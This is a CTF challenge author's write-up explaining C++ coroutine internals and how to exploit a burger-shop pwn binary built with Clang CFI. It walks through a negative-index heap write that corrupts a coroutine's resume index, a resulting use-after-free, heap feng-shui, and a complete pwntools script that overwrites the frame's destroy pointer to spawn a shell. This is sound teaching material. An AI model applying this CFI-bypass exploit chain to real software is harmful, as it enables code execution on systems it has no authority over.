---
title: awaiting_burgers – TORX CTF Finals 2026
toc_subsections: false
artifacts:
  - label: challenge.zip
    url: /artifacts/awaiting_burgers/challenge.zip
---

`awaiting_burgers` is a C++ pwn challenge I designed for TORX CTF Finals 2026.
As the name vaguely suggests, the challenge is about corrupting coroutine frames 
to obtain code execution in a CFI-compiled binary.

The program is a burger shop simulation. We can keep
several tickets open, change the quantities of their ingredients, and confirm
them when they are ready to be cooked. Nothing cooks in the background: each
time we choose **Wait for kitchen update**, the program lets the kitchen make
one step of progress. An order may stop while it waits for confirmation or for
its cooking timer, then continue from that point on a later update. C++
coroutines are what make this possible.

Hopefully this challenge will teach you something about C++ coroutines, how they are
represented in memory, and why their frames can be target of 
memory corruption.

Big shout-out to [@leo_something](https://leo1.cc/) for putting in the time and patience to test the challenge before the CTF!

## Background on coroutines

An ordinary function runs from its call to its return. If it needs a result
that is not available yet, it can block, arrange a callback, or return and let
its caller track what remains to be done. A C++ coroutine offers another
option: it can **suspend** partway through and later **resume** at the same
point, with the values it still needs preserved. The compiler turns it into a state
machine, there is no parallel execution or other tasks spawned!

C++ deliberately leaves much of a coroutine's behavior to its return type
and to the objects it _awaits_. The language provides the suspension mechanism
but not one universal way to start, wait for, or resume a task. This makes
coroutines less immediately intuitive alone, but 
it also gives libraries room to build very different things on top of
the same mechanism, from generators to asynchronous I/O.

The simplest place to see that pause is a generator. Imagine a type
`Generator<int>` that gives its caller one number at a time:

```cpp
Generator<int> count_two() {
    int value = 1;
    co_yield value;
    ++value;
    co_yield value;
}
```

The first request for a number reaches `co_yield value`, gives back `1`, and
suspends. The next call resumes *after* that `co_yield`: it increments the
same `value` and gives back `2`. It does not start over with `value = 1`.
That is the basic idea, the function can hand control back without losing
its place or the local values it still needs.

The piece of C++ used to continue a paused coroutine is a
`std::coroutine_handle<>`. It identifies that coroutine, and calling
`handle.resume()` lets it run until it suspends again or finishes. A generator
type usually keeps this handle out of sight, so its caller can simply ask
for the next value, but the handle plays a central role in other scenarios.

`co_yield` is useful when a pause hands a value to the caller. `co_await` is
more powerful, it marks a place where the coroutine **may suspend**, but the
object being awaited decides whether it actually does. To start with the
simple case that definitely pauses, we can use
`co_await std::suspend_always{}`. Assume `work()` is a coroutine (it does `co_await` so it can be considered one!) and `Task` is a coroutine return
type that gives its caller a handle:

```cpp
Task work() {
    step_one();
    co_await std::suspend_always{};
    step_two();
}
```

On the first `resume()` (so on the first call), `step_one()` runs and the coroutine pauses at
`co_await`. The call returns. On the second `resume()`, the
coroutine picks up at `step_two()`. Again, this is
not a sleep or a background operation! It simply hands control back until
the owner chooses to resume it.

The expression after `co_await` is an **awaitable**. It supplies an
**awaiter**: either it is one itself, or it provides one through
`operator co_await`. The awaiter answers three questions:

1. `await_ready()`: is the operation ready now?
2. `await_suspend(handle)`: what should happen if the coroutine suspends?
3. `await_resume()`: what result should `co_await` produce when execution
   continues?

These methods are invoked automatically as part of `co_await`; we do not
call them ourselves. `await_ready()` runs first. If it returns `true`, there
is no suspension and `await_resume()` runs right away. If it returns
`false`, `await_suspend(handle)` runs as the coroutine suspends. When
execution continues, `await_resume()` runs before the next statement.

`std::suspend_always` is both the awaitable and its own awaiter. Its three
methods are, in essence:

```cpp
bool await_ready() const noexcept { return false; }
void await_suspend(std::coroutine_handle<>) const noexcept {}
void await_resume() const noexcept {}
```

Here `await_ready()` always returns `false`. `await_suspend()` receives the
handle, but does nothing with it; because it returns `void`, control goes
back to the caller of `resume()`. On the next `resume()`, `await_resume()`
runs, then `step_two()` runs. Its `void` return means this particular
`co_await` produces no value. A different awaiter could save the handle for
a later wakeup and return a result from `await_resume()`.

{{< figure src="/images/awaiting_burgers/coroutine-sequence.svg" width="760" alt="Generic sequence diagram: a caller creates a lazy-start coroutine, resumes it to a co_await that suspends, then resumes it to completion and destroys it; solid vertical segments mark which side is executing" caption="" >}}

The example assumes a *lazy-start* `Task`. Every coroutine has a
`promise_type` that helps define its behavior; in particular,
`initial_suspend()` controls what happens before the body first runs. If it
returns `std::suspend_always`, calling `work()` returns a task without
executing `step_one()`. Someone must explicitly resume it. Similarly, a
`final_suspend()` that returns `std::suspend_always` leaves a completed
coroutine suspended so its owner can observe `handle.done()` and release it
with `handle.destroy()`. Other task types can make different choices.

## Challenge overview
The binary has all the protections we would expect from a modern pwn challenge:

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
FORTIFY:    Enabled
```

The Makefile additionally enables Clang CFI with LTO (I did not recompile the libc with CFI though, but it's not relevant to the intended solution):

```make
CXXFLAGS := -std=c++20 -O2 -g -fPIE -flto -fvisibility=hidden \
    -fsanitize=cfi,cfi-cast-strict -fstack-protector-strong \
    -fcf-protection=full

LDFLAGS := -fuse-ld=lld -pie -flto \
    -fsanitize=cfi,cfi-cast-strict -Wl,-z,relro,-z,now
```


The program offers eight actions:

```text
1. Place order
2. Change ingredient quantity
3. Confirm order
4. Wait for kitchen update
5. View tickets
6. Collect ready order
7. Leave feedback
8. Leave
```

The first three actions manage a ticket. We choose a Classic, Bacon, or Garden
burger, receive a ticket number, adjust ingredient quantities if we like, and
confirm the order. The program accepts up to 20 open tickets, so several
burgers can be at different stages of preparation.

The other actions let us drive and inspect the kitchen through the order preparation:
option 4 processes one pending update, option 5 shows each ticket's status, 
and option 6 collects a ready burger and frees its ticket slot. 
Feedback (option 7) accepts one message
of up to 256 bytes. Option 8 leaves the shop, disposing of any work still in
progress. 

A `Recipe` holds a byte-array, one quantity byte for each of the 41 ingredient slots. 
A zero means the ingredient
is absent; the other accepted quantities are 1 through 5. Its helper methods
count the portions and require no more than 15 portions:

```cpp
struct Recipe {
    std::array<std::uint8_t, kIngredientSlots> quantities{};

    int quantity(Ingredient ingredient) const {
        return quantities[static_cast<std::size_t>(ingredient_code(ingredient))];
    }

    bool includes(Ingredient ingredient) const {
        return quantity(ingredient) != 0;
    }

    int total() const {
        int total = 0;
        for (int id = kFirstIngredient; id < kIngredientSlots; ++id) {
            total += quantities[static_cast<std::size_t>(id)];
        }
        return total;
    }

    bool valid() const {
        for (int id = kFirstIngredient; id < kIngredientSlots; ++id) {
            if (quantities[static_cast<std::size_t>(id)] > kMaxIngredientQuantity) {
                return false;
            }
        }
        const bool has_patty = includes(Ingredient::BeefPatty) ||
                                includes(Ingredient::VeggiePatty) ||
                                includes(Ingredient::ChickenPatty);
        const bool has_bun = includes(Ingredient::BriocheBun) ||
                             includes(Ingredient::SesameBun) ||
                             includes(Ingredient::PretzelBun);
        return has_patty && has_bun && total() <= kMaxIngredientsPerOrder;
    }
};
```

An `Order` is the ticket visible to the customer. Besides its ID and status,
it keeps a pointer to the recipe being cooked, the coroutine's handle, a
handle for the coroutine currently waiting on an event (this will make sense in a second),
and any event waiting to be delivered:

```cpp
struct Order {
    unsigned id = 0;
    Status status = Status::empty;
    Recipe* recipe = nullptr;
    std::coroutine_handle<> handle{};
    std::coroutine_handle<> waiter{};
    Event event = Event::none;
};
```

Finally, `Shop` owns the ticket slots and the scheduler (more on it in a second). 
`OrderRequest` is the
argument passed to `prepare_order()` when a ticket is placed:

```cpp
struct Shop {
    std::unique_ptr<char[]> feedback{};
    Scheduler scheduler{};
    std::array<Order, kMaxOrders> orders{};
    unsigned next_id = 1;
};

struct OrderRequest {
    Shop* shop = nullptr;
    Order* order = nullptr;
    Recipe recipe{};
};
```

Notice where the recipe lives: `Shop::orders` stores the ticket but no recipe
object. `OrderRequest` carries a copy of the chosen recipe into the
coroutine. After the coroutine starts, `Order::recipe` points to that copy so
ingredient changes can reach the recipe the kitchen will use. We will see why
that location matters later.

### How the kitchen handles an order

There is **one `prepare_order()` coroutine per ticket**. It holds the
instructions for that burger and pauses while it waits for customer
confirmation or for grilling to finish. Its handle identifies that one piece
of work; putting a handle in a queue does not create another burger or
coroutine.

The challenge has two kinds of `co_await`. `AwaitEvent` waits for a customer
decision. Its `await_suspend()` saves the current handle as `order.waiter`;
later, `signal()` places that waiter in the scheduler's ready queue. On
resumption, `await_resume()` consumes the pending event:

```cpp
struct AwaitEvent {
    Order& order;

    bool await_ready() const noexcept { return false; }

    void await_suspend(std::coroutine_handle<> handle) const noexcept {
        order.waiter = handle;
    }

    Event await_resume() const noexcept {
        const Event result = order.event;
        order.event = Event::none;
        return result;
    }
};
```

`WaitForUpdate` is the grilling wait. It saves the same handle as the
order's waiter *and* registers a timer with the scheduler. A customer
amendment can wake it before that timer expires. When it resumes, it clears
the waiter and cancels any timer still associated with this order:

```cpp
struct WaitForUpdate {
    Scheduler& scheduler;
    Order& order;
    unsigned duration;

    bool await_ready() const noexcept { return false; }

    void await_suspend(std::coroutine_handle<> handle) const {
        order.waiter = handle;
        scheduler.after(duration, handle);
    }

    Event await_resume() const noexcept {
        order.waiter = {};
        scheduler.cancel_timers(order.handle);
        const Event result = order.event;
        order.event = Event::none;
        return result;
    }
};
```

Neither awaitable cooks anything while the menu is displayed. They only
arrange for the suspended order to be eligible for a later kitchen update.

### Placing and confirming a ticket

`place()` takes a free slot in `Shop::orders`, builds the selected base recipe,
and packages the slot, the shop, and a copy of that recipe into an
`OrderRequest`. It then creates `prepare_order()`, hands ownership of its
handle to the scheduler, and resumes it once:

```cpp
Task flow = prepare_order(OrderRequest{&shop, order, recipe});
order->handle = flow.release();
shop.scheduler.own(order->handle);
order->handle.resume();
```

That first `resume()` stops before any cooking begins: `prepare_order()` points
`Order::recipe` at the recipe copy it holds, then pauses at
`co_await AwaitEvent{order}` with the ticket still in `draft` status. The
pointer lets customer edits reach the recipe the coroutine will use when it
eventually continues.

Confirming the draft changes its status to `queued` and calls
`signal(shop, order, Event::confirmed)`, which records the event and places
the waiting handle in the scheduler's ready queue. The coroutine does not
resume on the spot; the kitchen accepts the ticket only after we choose
option 4 to process an update.

### Cooking and changing an order mid-cook

On its next resume, `prepare_order()` continues **after** the confirmation
wait. It announces that the kitchen has accepted the ticket, changes the status
to `grilling`, and reaches its second wait:

```cpp
(void)(co_await AwaitEvent{order});
order.event = Event::none;
std::printf("Ticket %u: kitchen accepts the order\n", order.id);

order.status = Status::grilling;
for (;;) {
    const Event event = co_await WaitForUpdate{
        shop.scheduler, order, grill_time(recipe)};
    if (event != Event::changed) {
        break;
    }
    std::printf("Ticket %u: kitchen acknowledges amendment\n", order.id);
}

std::printf("Ticket %u: assemble %d ingredient portions.\n",
            order.id, recipe.total());
order.status = Status::ready;
```

`WaitForUpdate` saves the handle in a timer due after `grill_time(recipe)`
units of **kitchen time**. A Classic burger with one patty and no egg takes two
units. The coroutine pauses again, leaving the menu available for other
orders. There is no separate grill coroutine or worker thread.

The customer may still amend a queued or grilling ticket. A valid amendment
changes the recipe and signals `Event::changed`. If the coroutine is already
waiting at the grill, `signal()` puts its handle in the ready queue. When the
kitchen next resumes it, `WaitForUpdate` cancels the old timer.
`prepare_order()` sees the change, acknowledges it, computes a new grill time
from the updated recipe, and pauses on a new timer. An amendment made while
the ticket is still queued changes its recipe before grilling starts; its
handle is already in the ready queue. If the timer expires normally instead,
the loop ends, the burger is assembled, and the ticket becomes `ready`.

### What option 4 actually does

The `Scheduler` keeps three collections of handles: `owned_` tracks frames it
must eventually destroy, `ready_` contains work that can run now, and
`timers_` contains work waiting for a kitchen time. The ready queue and timer
entries are copies of handles, not copies of the order or recipe.

Each call to `Scheduler::next()` first looks for a ready handle. If there is
none, it advances the logical kitchen clock to the earliest timer and moves
**all** timers due at that time into the ready queue. It then removes one
handle from the queue and resumes that one coroutine:

```cpp
const auto handle = ready_[ready_head_];
ready_[ready_head_] = {};
ready_head_ = (ready_head_ + 1) % ready_.size();
--ready_count_;

handle.resume();
if (handle.done()) {
    for (auto& owned : owned_) {
        if (owned == handle) {
            owned = {};
            handle.destroy();
            break;
        }
    }
}
```

`resume()` runs until the coroutine reaches another `co_await` or finishes.
When it finishes, `final_suspend()` leaves the completed frame in place long
enough for `handle.done()` to report true, then the scheduler destroys it.
The ready ticket can be collected afterward. Collection clears the `Order`
slot for reuse; it is not what frees the already completed coroutine frame.

For a single, unmodified Classic burger, the visible sequence is short:

| Customer action | Ticket status afterward | Where the coroutine is |
| --- | --- | --- |
| Place | `draft` | Paused, waiting for confirmation |
| Confirm | `queued` | Its handle is ready, but has not run yet |
| Wait for kitchen update | `grilling` | Paused on a timer due at kitchen time 2 |
| Wait for kitchen update | `ready` | Timer fires; it assembles the burger and finishes |
| Collect | Slot becomes empty | The finished frame was already destroyed |

With multiple tickets, the same two kinds of waits coexist. Several confirmed
orders can sit in `ready_`, and several burgers can have timers pending. One
menu choice still resumes only one order, so we can control the exact order in
which the kitchen reaches each phase. That control will be useful shortly.

## Vulnerability

The vulnerable operation is the function that changes an ingredient quantity:

```cpp
void change(Shop& shop, Order& order, int ingredient, unsigned quantity) {
    if (quantity > kMaxIngredientQuantity) {
        std::puts("Choose a quantity from 0 to 5");
        return;
    }

    const bool listed_ingredient = is_ingredient(ingredient);
    if (!listed_ingredient) {
        ingredient %= kIngredientSlots;
    }
    if (ingredient == 0 ||
        (order.status == Status::draft && !listed_ingredient)) {
        std::puts("Choose an ingredient number from the list");
        return;
    }

    auto& selected = order.recipe->quantities.data()[ingredient];
    const std::uint8_t previous = selected;
    selected = static_cast<std::uint8_t>(quantity);

    if (!order.recipe->valid()) {
        selected = previous;
        std::puts("A burger needs a bun and a patty and can contain at most "
                  "15 ingredient portions :(");
        return;
    }

    if (order.status != Status::draft) {
        signal(shop, order, Event::changed);
    }
}
```

There are 41 recipe slots. The modulo looks as if it folds every unusual input
back into the ingredient table, but negative numbers remain negative:

```text
-100 % 41 = -18
-81  % 41 = -40
-82  % 41 = 0
```

Draft orders reject every number that was not originally listed but confirmed
orders do not! Once an order has entered the kitchen, an input such as `-14`
therefore survives the checks and is used as a negative array index.

The modulo still gives the bug a useful bound. The effective index can only be
between `-40` and `-1`; negative multiples of 41 become zero and are rejected.
Each operation writes one quantity byte whose value is between `0x00` and `0x05`.

What we know is:

- `order.recipe` points into a weird heap allocation
- we can address as far as 40 bytes before `quantities[0]`
- we can store a small controlled byte there, its value in the range \[0x00; 0x05\]
- the normal recipe validation does not inspect those preceding bytes

So the primitive is small, but it if something useful is at reach it can be enough. 
To decide what is worth changing, we need to understand what that
allocation really is.

## Coroutine frames

When a coroutine suspends, the values it will need on the next `resume()`
must survive the return to its caller. A compiler keeps that state in a
**coroutine frame**, which the coroutine's handle refers to. Frames are
commonly allocated on the heap, although C++ does not fix their allocation
or layout; both can vary with the compiler and optimization settings.

The frame can hold copied parameters, local values that outlive a suspension,
and an awaiter that is still in use. It also contains a **promise object**: an
instance of the coroutine return type's `promise_type`, separate from the
`Task` or generator object returned to the caller. The promise supplies hooks
such as `initial_suspend()` and `final_suspend()` and handles the coroutine's
result or an unhandled exception. In the implementation shown below, the frame
also holds **resume** and **destroy** stub pointers and a _coroutine index_:

{{< figure src="/images/awaiting_burgers/coroutine-frame.svg" width="280" alt="Schematic coroutine frame: resume and destroy pointers at the top, followed by bands for the promise, coroutine index, parameters, locals, and optional awaiter state" >}}

Two handle operations matter here. `handle.resume()` lets the
coroutine run again, calling the **resume stub**. It receives the frame and
continues the coroutine from its saved suspension point. By contrast,
`handle.destroy()` ends a suspended coroutine without running the rest of
its body: the **destroy stub** cleans up the still-live objects and promise,
then releases the frame's storage. A coroutine that has reached its final
suspension still needs this cleanup if its frame remains allocated.

Following either pointer is an indirect call, which makes control-flow integrity relevant:
Clang CFI can normally check that an indirect call's destination has the
type expected at that call site. The generated calls through a coroutine
frame, however, do not necessarily receive the same checks as an ordinary
function-pointer call.

That gap is one of the observations in Bajo and Rossow's [*Await() a Second:
Evading Control Flow Integrity by Hijacking C++ Coroutines*](https://www.usenix.org/conference/usenixsecurity25/presentation/bajo) where they call the broader family of attacks on coroutine frames
**Coroutine Frame-Oriented Programming (CFOP)**. The important qualification
is that CFI coverage is a property of the *generated binary*, not of the
`resume()` or `destroy()` syntax.

### The coroutine index

After a suspension, the resume stub needs to know where in the coroutine
body to continue. A small value, called
the **coroutine index**, is used to distinguish its suspension points. The stub reads
it when the handle is resumed and selects the corresponding
continuation. Also this index is generated by the compiler and its position inside the frame 
can be different depending on the compilation.

### Awaiter state

The coroutine index identifies *where* execution paused, but it does not hold
everything needed to finish the wait. An awaiter may itself carry data that
must survive suspension. If its `await_resume()` still needs that data, the awaiter (or
the relevant parts of it) can also live in the frame. Exactly what remains
there depends on the awaiter's lifetime and compiler optimizations; an
empty awaiter such as `std::suspend_always` has nothing to preserve.
This is not really relevant for this challenge but it's good to know.

### Back to `prepare_order()`

Each `prepare_order()` frame is allocated in the heap and
begins with its resume and destroy stub pointers. Its `OrderRequest` was
passed by value, so the recipe copy and its ingredient quantities live later
in the same frame.

The frame also contains the coroutine index at offset `0x11`. Apart from
the initial and final suspensions, these are the two waits it
distinguishes:

| Saved state | Coroutine is waiting at | Normal wake-up |
| ---: | --- | --- |
| 1 | `co_await AwaitEvent{order}` | confirmation |
| 2 | `co_await WaitForUpdate{...}` | timer or amendment |

The awaiters bring their own context to those waits: `AwaitEvent` refers to
the order whose event it will consume, while `WaitForUpdate` uses the order,
the scheduler, and a duration. Which fields are retained at each suspension
is visible in the generated frame type. In the dump below, the frame starts
after the chunk header: the resume pointer is at frame offset `+0x00`, the
destroy pointer at `+0x08`, the coroutine index at `+0x11`, and the recipe's
ingredient quantities start at `+0x28`.

{{< figure src="/images/awaiting_burgers/coroutine_frame_raw.png" alt="Heap dump of a live prepare_order frame" >}}


## Exploitation

So, how can we pwn it? Let's forget for a moment about leaking addresses to bypass ASLR and PIE.
Looking at what we can reach with that negative OOB write, 
we see that we can overwrite up until the resume stub function pointer... 
We can't reach the heap chunk size or the previous chunk.
The first thing that comes to mind could be to corrupt one of the two stub pointers, 
since they are not protected by CFI, to try to hijack control flow, but the write primitive is limited to bytes \[0x00; 0x05\] so we can't forge an arbitrary address there.
Maybe there is some cursed gadget that can be found with those constraints but that's something I didn't even try.
Instead of tampering with the function pointers directly, we can instead do some interesting stuff corrupting the coroutine index.

### 1. Rewind the coroutine

Clang 22 gives `prepare_order` the following relevant layout in the supplied
build:

```text
frame + 0x00    resume stub pointer
frame + 0x08    destroy stub pointer
frame + 0x11    saved suspension state
frame + 0x28    recipe.quantities[0]
```

The frame requests `0x80` bytes, so glibc stores it in a `0x90` chunk.

Ingredient `-23` reaches the coroutine index byte:

```text
0x28 - 23 = 0x11
```

After confirmation has been processed, the order is suspended in
`WaitForUpdate` with state 2. Setting ingredient `-23` to quantity 1 changes
that state from 2 back to 1.

The underlined `02` is that index byte before the change.

{{< marked-screenshot src="/images/awaiting_burgers/coroutine_frame_raw.png" alt="Coroutine index byte in a live frame" marks="66.4,33.2,2.8" thickness="3" >}}

The amendment calls `signal()`, which queues the handle for another
`resume()`. Its cooking timer is still pending, but the changed index makes
that resume return from the wrong `co_await`:

```cpp
(void)(co_await AwaitEvent{order});  // 1: first suspension point
order.event = Event::none;
std::printf("Ticket %u: kitchen accepts the order\n", order.id);
order.status = Status::grilling;
for (;;) {
    const Event event = co_await WaitForUpdate{ // 2: from where the coroutine should resume 
        shop.scheduler, order, grill_time(recipe)};
    // ...
}
```

The coroutine was waiting at `WaitForUpdate`, but it now acts as if
`AwaitEvent` has just finished. It runs `AwaitEvent::await_resume()`, then
continues with `order.event = Event::none;` and the kitchen-acceptance code.
Normally, returning from `WaitForUpdate` would call its `await_resume()` and
cancel the old timer. This path skips that cancellation and reaches
`WaitForUpdate` again, adding a second timer. **Both timers hold the same
handle**, pointing to the same frame; when they expire, the scheduler puts
that handle in the ready queue twice. In the dump below, each row is one
timer: its due time is on the left and its handle is on the right. The last
two nonzero handles are the same.

{{< marked-screenshot src="/images/awaiting_burgers/duplicate.png" alt="Two timers holding the same coroutine handle" marks="67.0,84.6,29.5;67.0,89.3,29.5" >}}

### 2. Turn the double handle into a UAF

Both cooking timers eventually put the target's handle in the ready queue.
At this point there are two copies of **one handle**, both refer to the
same coroutine frame. The scheduler resumes the first copy, and because the amendment
event was already consumed on the wrong path, the cooking wait ends normally.
The coroutine reaches `final_suspend()`; `Scheduler::next()` sees that it is
done and calls `handle.destroy()`, freeing the frame.

The second queue entry is still there. It contains the same frame address,
but that frame has just been freed. If the scheduler later resumes or destroys
this entry, it will treat freed memory as a live coroutine frame, so it's
a UAF.

### 3. Reuse the frame with feedback

The feedback option gives us an allocation of a chosen size and a raw read
into it:

```cpp
shop.feedback = std::make_unique_for_overwrite<char[]>(capacity);
std::fputs("Feedback: ", stdout);
::read(STDIN_FILENO, shop.feedback.get(), capacity);
```

The buffer is not initialized, and the read can be shorter than the requested
size. If this allocation reuses the freed frame, the stale handle and the
feedback buffer point to the same address. We can then write over the first
two words, where the old frame held its resume and destroy stub pointers.

One possibility is to replace the resume pointer with a suitable `one_gadget`
and let the scheduler resume the stale handle, although that would depend on
the gadget's register and stack constraints. Destroy is simpler. A call to
`handle.destroy()` passes the frame address in `rdi` and takes its target from
`frame+8`. If the first word contains `"/bin/sh\0"` and the second contains
the address of `system`, the call behaves like `system(frame)` and opens a
shell. We can trigger it by choosing **leave**: `Scheduler::~Scheduler()`
destroys the stale queued handle. Feedback is still alive then, because it is
declared before the scheduler in `Shop` and is destroyed afterward.

There is one missing piece: without a libc leak, we do not know the address of
`system`. We can arrange for the allocator to leave a libc pointer in the
freed frame and change only the bytes we need.

### 4. Feng-shui and partial overwrite

Since `destroy()` is at offset +0x08 in the coroutine frame, we want the freed
chunk's bin links to put libc pointers at offsets +0x00 and +0x08. We place 18
orders: tickets 1 through 16 will fill the `0x90` tcache bin (libc 2.43 needs 16 chunks to fill tcache), ticket 17 is
our target, and ticket 18 stays allocated to keep that target away from the
top chunk. We advance the first 17 tickets to their cooking waits, use `-23`
to give ticket 17 a second timer, and then process the timers in order; the
first 16 frames fill tcache, while the first copy of ticket 17 finishes and
its frame goes to the unsorted bin with the second copy of its handle still
queued. By the time of this dump, the allocator has moved the frame from the
unsorted bin to a small bin. The links still leave libc pointers in the former
resume and destroy slots.

{{< marked-screenshot src="/images/awaiting_burgers/smallbin.png" alt="Freed frame in a small bin with libc pointers in its first two words" marks="26.9,21.4,14.0;41.9,21.4,14.0" >}}

Requesting 112 bytes for feedback reuses that `0x90` chunk, since there is no
suitable chunk in tcache. A short read lets us replace only its first
11 bytes:

```python
payload = b"/bin/sh\0" + p32(system_low)[:3]
```

The first eight bytes become `"/bin/sh\0"`, while the next three replace
only the low bytes of the libc pointer in the destroy slot; its upper
five bytes remain untouched. 

With a 12-bit bruteforce we can successfully trigger a call to `system("/bin/sh")` and pop a shell.

### 5. Complete exploit


```python
from pwn import *

libc = ELF("./libc.so.6")

HOST = "127.0.0.1"
PORT = 1338
ATTEMPTS = 20000

BASE_LOW = 0x000000


def attempt():
    r = remote(HOST, PORT)
    try:
        commands = [b"1\n1\n"] * 18
        commands += [f"3\n{ticket}\n".encode()
                     for ticket in range(1, 18)]
        commands += [b"4\n"] * 17

        commands += [b"2\n17\n-23\n1\n4\n"] # ticket 17: coroutine index 2 -> 1

        # we free 16 fillers and then the first copy of the target handle
        commands += [b"4\n"] * 17

        # reclaim part of the target's 0x90 chunk with a 112-byte request
        commands += [b"7\n112\n"]

        r.send(b"".join(commands))
        r.recvuntil(b"Feedback: ")

        system_low = (BASE_LOW + libc.sym.system) & 0xffffff
        r.send(b"/bin/sh\0" + p32(system_low)[:3])
        r.recvuntil(b"Feedback recorded.")

        # trigger handle.destroy()
        r.sendline(b"8")
        r.recvuntil(b"What a waste of food... shame on you!")
        r.sendline(b"echo 'john cena'")
        if b"SHELL_READY" in r.recvuntil(b"john cena", timeout=1):
            return r 
    except EOFError:
        pass
    r.close()
    return None


for attempt_number in range(1, ATTEMPTS + 1):
    shell = attempt()
    if shell is not None:
        print(f"success after {attempt_number} attempts")
        shell.interactive()
        shell.close()
        break
else:
    raise SystemExit("exploit failed")
```

flag: `TORX{https://www.youtube.com/watch?v=bJJ_yASaLzI}`




